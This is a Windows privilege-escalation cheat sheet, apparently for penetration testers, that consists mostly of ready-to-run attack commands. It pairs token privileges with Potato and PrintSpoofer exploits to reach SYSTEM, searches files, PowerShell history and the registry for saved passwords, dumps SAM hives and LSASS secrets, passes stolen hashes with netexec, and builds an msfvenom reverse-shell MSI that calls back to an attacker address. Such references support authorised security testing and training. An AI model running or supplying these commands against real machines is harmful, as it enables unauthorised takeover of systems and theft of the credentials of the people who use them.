# Windows privilege escalation cheat sheet

## Automated first
```powershell
.\winPEASx64.exe                         # everything
.\PrivescCheck.ps1 -Extended             # PowerShell alternative
# From your box (SharpUp / Seatbelt via evil-winrm -e):
Invoke-Binary /opt/SharpUp.exe audit
```

## The single most important check
```powershell
whoami /priv
```
| Privilege | Exploit |
|-----------|---------|
| `SeImpersonatePrivilege` | **PrintSpoofer** / **GodPotato** / JuicyPotato → SYSTEM |
| `SeAssignPrimaryToken` | Potato variants |
| `SeBackupPrivilege` | read SAM/SYSTEM hives → secretsdump |
| `SeRestorePrivilege` | overwrite protected files/services |
| `SeDebugPrivilege` | dump LSASS / inject |
| `SeTakeOwnership` | own a privileged file → replace |

```powershell
# SeImpersonate → SYSTEM (most common service-account win)
.\PrintSpoofer64.exe -i -c "C:\Windows\Temp\rev.exe"
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

## Manual checklist
```powershell
systeminfo                                       # OS/patch level -> WES-NG
whoami /all
cmdkey /list                                     # saved creds -> runas /savecred
# Unquoted service paths
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """
# Weak service perms (accesschk / winPEAS covers this)
# AlwaysInstallElevated (instant SYSTEM if both = 1):
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Credential hunting
```powershell
# Files
findstr /si password *.txt *.ini *.config *.xml
Get-ChildItem -Path C:\ -Include *.kdbx,*.config,unattend.xml,web.config -Recurse -EA 0
type C:\Windows\Panther\Unattend.xml
# PowerShell history (super common)
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
# Registry autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## Dump hashes / LSASS (as admin/SYSTEM)
```
reg save HKLM\SAM sam ; reg save HKLM\SYSTEM system    # then secretsdump.py -sam sam -system system LOCAL
```
```bash
netexec smb host -u admin -H <hash> --sam --lsa --dpapi
```

## AlwaysInstallElevated payload
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f msi -o s.msi
# on target:  msiexec /quiet /qn /i C:\Temp\s.msi
```
